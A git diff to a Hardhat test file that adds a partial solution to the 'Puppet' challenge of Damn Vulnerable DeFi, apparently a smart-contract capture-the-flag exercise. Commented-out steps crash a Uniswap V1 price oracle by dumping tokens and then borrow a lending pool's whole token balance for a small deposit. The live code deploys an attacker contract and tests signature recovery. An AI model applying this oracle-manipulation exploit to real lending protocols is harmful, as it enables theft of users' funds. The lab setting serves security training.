@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { keccak256 } = require("@ethersproject/keccak256");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -94,7 +95,71 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        async function getReport() {
+            async function showBalances(tag, id) {
+                const ethBalance = await ethers.provider.getBalance(id.address);
+                const dvtBalance = await token.balanceOf(id.address);
+
+                console.log(tag);
+                console.log(`ETH: ${ethBalance}`);
+                console.log(`DVT: ${dvtBalance}`);
+            }
+
+            console.log('-----------------------------------------------');
+            await showBalances('player', player);
+            console.log();
+            await showBalances('DEX', uniswapExchange);
+            console.log();
+            await showBalances('pool', lendingPool);
+            console.log('-----------------------------------------------');
+        }
+
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        
+        // await getReport();
+        //
+        // await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        // await uniswapExchange.connect(player).tokenToEthSwapInput(
+        //     PLAYER_INITIAL_TOKEN_BALANCE,
+        //     1,
+        //     deadline,
+        //     {gasLimit: 1000000}
+        // );
+        //
+        // await getReport();
+        //
+        // const deposit = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // await lendingPool.connect(player).borrow(
+        //     POOL_INITIAL_TOKEN_BALANCE, 
+        //     player.address,
+        //     { value: deposit }
+        // );
+        //
+        // await getReport();
+      
+        const Attacker = await ethers.getContractFactory('AttackerPuppet', player);
+        const attacker = await Attacker.deploy();
+
+        const message = await attacker.getMessage(
+            token.address,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            deadline
+        );
+
+        const messageBytes = ethers.utils.arrayify(message);
+        const messageHash = ethers.utils.hashMessage(messageBytes);
+        
+        const messageHashBytes = ethers.utils.arrayify(messageHash);
+        // const signature = await player.signMessage(messageHashBytes);
+        const signature = await player.signMessage(messageBytes);
+        const recoveredAddress = ethers.utils.verifyMessage(messageBytes, signature);
+        console.log("player  :", player.address);
+        console.log("recover1:", recoveredAddress);
+
+        const split = ethers.utils.splitSignature(signature);
+        const actualSigner = await attacker.recover(messageHash, split.v, split.r, split.s);
+        console.log("recover2:", actualSigner);
+
     });
 
     after(async function () {
